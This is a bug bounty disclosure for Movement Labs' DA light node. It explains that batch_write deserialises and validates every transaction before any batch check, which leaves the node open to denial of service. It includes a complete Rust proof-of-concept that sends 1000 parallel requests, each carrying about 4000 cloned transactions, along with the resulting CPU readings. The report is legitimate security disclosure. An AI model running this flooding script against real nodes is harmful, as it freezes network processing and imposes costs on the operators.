# #43315 \[BC-Critical] DA Light Node Can Be DoSed Due to Lack of Batch Validation

**Submitted on Apr 4th 2025 at 14:19:37 UTC by @Nirix0x for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #43315
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/protocol-units/da/movement/protocol/da>
* **Impacts:**
  * Temporary freezing of network transactions by delaying one block by 500% or more of the average block time of the preceding 24 hours beyond standard difficulty adjustments
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

## Brief/Intro

The light node's batch\_write function processes incoming transactions by iterating through each one individually and performing potentially expensive validation (like deserialization, signature checks, and whitelist lookups) before applying any checks and validations to the batch as a whole. This allows an attacker to flood the node with a large number of transactions in a single request and send multiple such batch\_write requests , exhausting node resources and leading to a DoS, potentially significantly slowing or crashing in worst case DA light node. Such an attack will also incur cost for the protocol due to these transactions being saved in Celestia.

## Vulnerability Details

The issue lies in the `batch_write` function within the light node's sequencer mode (`protocol-units/da/movement/protocol/light-node/src/sequencer.rs`). Upon receiving a `BatchWriteRequest`, the code immediately iterates through each contained `blob` without first performing any checks on the overall batch if it is being sent from an whitelisted sequencer node (only transaction senders are checked against a whitelist)

Inside this loop, each blob undergoes potentially expensive processing individually:

1. JSON Deserialization (`serde_json::from_slice`).
2. A call to `prevalidator.prevalidate`, which itself performs further per-transaction work including BCS deserialization, signature verification, and sender whitelist checks (handled in `protocol-units/da/movement/protocol/prevalidator/src/aptos/...`).

```rust
// In light-node/src/sequencer.rs -> batch_write
// ...
let blobs_for_submission = request.into_inner().blobs;
let mut transactions = Vec::new();
// ---> LOOP STARTS immediately without batch checks <---
for blob in blobs_for_submission {
    // ---> Per-blob deserialization & validation occurs inside <---
    let transaction: Transaction = serde_json::from_slice(&blob.data)...;
    match &self.prevalidator {
        Some(prevalidator) => {
            match prevalidator.prevalidate(transaction).await { ... }
        }
        // ...
    }
}
```

These expensive steps occur per-transaction before any batch-level validation. External actors can easily overwhelm the node by sending a large volume of batch\_write requests. Further, all these transactions will be stored in Celestia incurring a cost for the protocol while attacker can minimize their cost by sending non-executable large transactions.

## Impact Details

The primary impact is a Denial-of-Service (DoS) attack against Movement light nodes. Attackers can trigger resource exhaustion (CPU/memory) by sending large batches, forcing repetitive, expensive per-transaction validation. This can cause nodes to become unresponsive or crash. A secondary impact is wasted Data Availability (DA) layer costs, as protocol might be forced to pay fees (e.g., to Celestia) for blocks filled with valid but ultimately non-executable junk transactions that bypass the validation.

## References

Mentioned above

## Proof of Concept

## Proof of Concept

Run this script against the DA Light Node (adapted version of whitelist.rs) which sends 1000 parallel batch\_write each with 4000 txs.

```rust
use anyhow::{anyhow, Context, Result};
use movement_client::{
    coin_client::CoinClient,
    move_types::identifier::Identifier,
    move_types::language_storage::ModuleId,
    rest_client::{Client, FaucetClient},
    transaction_builder::TransactionBuilder,
    types::account_address::AccountAddress,
    types::transaction::{EntryFunction, TransactionPayload},
    types::LocalAccount,
    BatchWriteRequest, BlobWrite, MovementDaLightNodeClient,
};
use movement_client::types::chain_id::ChainId;
use std::str::FromStr;
use std::time::{SystemTime, UNIX_EPOCH};
use url::Url;
use std::io::{self, Write};

#[tokio::main]
async fn main() -> Result<()> {
    // Hardcoded URLs from the second script
    let node_url = Url::from_str("http://127.0.0.1:30731")?;
    let faucet_url = Url::from_str("http://127.0.0.1:30732")?;
    
    let rest_client = Client::new(node_url.clone());
    let faucet_client = FaucetClient::new(faucet_url.clone(), node_url.clone());
    let coin_client = CoinClient::new(&rest_client);

    // Create two accounts locally, Alice and Bob
    let mut alice = LocalAccount::generate(&mut rand::rngs::OsRng);
    let bob = LocalAccount::generate(&mut rand::rngs::OsRng);

    // Print account addresses
    println!("\n=== Addresses ===");
    println!("Alice: {}", alice.address().to_hex_literal());
    println!("Bob: {}", bob.address().to_hex_literal());

    // Fund Alice's account and create Bob's account
    println!("\nFunding Alice's account from faucet...");
    faucet_client.fund(alice.address(), 100_000_000).await?;
    println!("Creating Bob's account...");
    faucet_client.create_account(bob.address()).await?;

    // Print initial balances
    println!("\n=== Initial Balances ===");
    println!(
        "Alice: {:?}",
        coin_client.get_account_balance(&alice.address()).await?
    );
    println!(
        "Bob: {:?}",
        coin_client.get_account_balance(&bob.address()).await?
    );

    println!("\n--------------------------------------------------");
    println!("Direct DA submission from Alice to Bob:");
    println!("  Sender (Alice): {}", alice.address().to_hex_literal());
    println!("  Recipient (Bob): {}", bob.address().to_hex_literal());
    println!("  Amount: 1000");
    print!("Proceed with this transfer? (y/n): ");
    io::stdout().flush().context("Failed to flush stdout")?;

    let mut input = String::new();
    io::stdin().read_line(&mut input).context("Failed to read user input")?;

    if !input.trim().eq_ignore_ascii_case("y") {
        println!("User aborted the operation.");
        return Err(anyhow!("User aborted the operation."));
    }
    println!("Proceeding with direct DA submission...");
    println!("--------------------------------------------------");

    let light_node_connection_protocol = "http";
    let light_node_connection_hostname = "127.0.0.1";
    let light_node_connection_port = "30730";
    
    let light_node_url = format!(
        "{}://{}:{}",
        light_node_connection_protocol,
        light_node_connection_hostname,
        light_node_connection_port
    );
    
    println!("Connecting to DA Light Node at: {}", light_node_url);
    
    let mut da_client = MovementDaLightNodeClient::try_http2(light_node_url.as_str()).await?;

    // Create a raw transaction from Alice to Bob with the same parameters
    let transaction_builder = TransactionBuilder::new(
        TransactionPayload::EntryFunction(EntryFunction::new(
            ModuleId::new(AccountAddress::from_str_strict("0x1")?, Identifier::new("coin")?),
            Identifier::new("transfer")?,
            vec![],
            vec![bcs::to_bytes(&bob.address())?, bcs::to_bytes(&1000_u64)?],
        )),
        SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs() + 20,
		ChainId::new(126), // ChainId in a compatible way
    )
    .sender(alice.address())
    .sequence_number(alice.sequence_number())
    .max_gas_amount(5_000)
    .gas_unit_price(100);

    // Create the blob write
    let signed_transaction = alice.sign_with_transaction_builder(transaction_builder);
    let txn_hash = signed_transaction.committed_hash();
    let mut transactions = vec![];
    let serialized_aptos_transaction = bcs::to_bytes(&signed_transaction)?;
    let movement_transaction = movement_client::movement_types::transaction::Transaction::new(
        serialized_aptos_transaction,
        0,
        signed_transaction.sequence_number(),
    );
    let serialized_transaction = serde_json::to_vec(&movement_transaction)?;
    transactions.push(BlobWrite { data: serialized_transaction.clone() });
	transactions.push(BlobWrite { data: serialized_transaction.clone() });
	for _ in 0..4000 {
		transactions.push(BlobWrite {
			data: serialized_transaction.clone(),
		});
	}
	
    let batch_write = BatchWriteRequest { blobs: transactions };

    // Write the batch to the DA
    println!("Submitting transaction to DA layer...");
    let batch_write_response = da_client.batch_write(batch_write.clone()).await?;

    // Check response
    println!("Batch write response contains {} blobs", batch_write_response.blobs.len());
    assert_eq!(batch_write_response.blobs.len(), 0);

	//if everythng is fine send more requests
	for i in 0..1000 {
		// Clone client and payload for the task
		let mut cloned_client = da_client.clone();
		let cloned_payload = batch_write.clone();
	
		// Spawn a Tokio task. It runs independently.
		tokio::spawn(async move {
			match cloned_client.batch_write(cloned_payload).await {
				Ok(_) => { /* Maybe log success if desired */ }
				Err(status) => {
					// Log error here, as we can't collect it later
					eprintln!("Task {} failed: {:?}", i, status);
				}
			}
		});
	}

    // Wait for the transaction hash on the full node
    println!("Waiting for transaction execution...");
	tokio::signal::ctrl_c()
        .await
        .expect("Failed to install Ctrl+C signal handler");

    println!("\nCtrl+C received, exiting program.");
    Ok(())
}
```

Resource consumption e.g. 450%+ CPU is observed directly on the container as well slowness in processing blocks`32b31ee1fcd8 movement-celestia-da-light-node 458.26% 5.836GiB / 7.653GiB 76.25% 10.3GB / 16MB 383MB / 1.22GB 26`
